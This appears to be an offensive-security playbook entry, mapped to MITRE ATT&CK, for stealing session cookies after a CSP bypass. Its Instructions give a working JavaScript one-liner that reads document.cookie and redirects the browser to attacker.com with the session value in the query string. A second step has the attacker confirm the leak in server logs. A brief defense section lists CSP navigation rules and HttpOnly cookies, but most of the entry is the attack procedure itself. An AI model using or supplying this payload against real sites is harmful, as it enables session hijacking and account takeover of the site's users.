---
tags:
  - session-exfiltration
  - open-redirect
  - cookie-theft
type: procedure
tools:
  - '[[tools/Browser-Developer-Console]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/exfiltrate-session-redirect]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
updated_at: '2025-12-14T17:30:17.959Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 35858db8-5375-43c4-ba6e-ac649cdd113b
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Exfiltration Over Command and Control Channel]]'
---
# Exfiltrate-Session-via-Open-Redirect

## Summary

This procedure escalates a CSP bypass by injecting JavaScript to extract session cookies and perform an open redirect to an attacker-controlled server, enabling session hijacking.

## Description

Building on dynamic injection capabilities, this targets session data in document.cookie on sites like https://portswigger.net/. The payload parses the cookie (assuming sessionid=value format), appends a dot, and redirects to https://attacker.com/ with the value in the query string. This exfiltrates sensitive data without direct CSP violation, as redirects are not explicitly blocked.

## Requirements

1. Established session with cookies set.
2. Attacker-controlled domain (e.g., attacker.com) for receiving data.
3. Browser console access post-bypass confirmation.

## Defense

Defensive measures and detection strategies:

- Include strict navigation policies in CSP (e.g., navigate-to 'self').
- HttpOnly and Secure flags on session cookies to prevent JS access.
- Monitor for unexpected redirects and query parameters on logs.

## Objectives

1. Extract session ID from cookies.
2. Redirect to exfiltrate data.
3. Enable attacker to hijack the session.

## Instructions

### Step 1: Execute Exfiltration Payload

**Context**: Parse and leak cookie data via redirect.

**Command** ([[commands/exfiltrate-session-redirect]]):
```javascript
var sessionid = document.cookie.split('=')[1] + '.'; document.location = 'https://attacker.com/?' + sessionid;
```

> Splits cookie at '=', takes value after first =, appends '.', and sets location to attacker URL with query; browser navigates.

### Step 2: Validate Exfiltration

**Context**: Confirm data receipt on attacker side.

Check attacker server logs for query parameter.

> Logs show ?<sessionid>., confirming leak.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Exfiltration Over Command and Control Channel]]

### Sub-Techniques


## Commands Used

- [[commands/exfiltrate-session-redirect]]

## Tools Used

- [[tools/Browser-Developer-Console]]

## Tags

- session-exfiltration
- open-redirect
- cookie-theft
